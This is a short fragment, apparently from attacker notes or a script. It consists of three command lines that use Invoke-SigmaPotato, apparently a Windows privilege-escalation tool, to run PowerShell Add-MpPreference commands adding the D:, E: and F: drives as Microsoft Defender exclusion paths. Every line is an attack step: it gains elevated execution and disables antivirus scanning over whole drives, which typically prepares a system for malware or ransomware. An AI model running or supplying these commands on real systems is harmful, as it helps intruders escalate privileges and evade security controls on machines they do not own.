...
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath D:\"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath E:\"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath F:\"
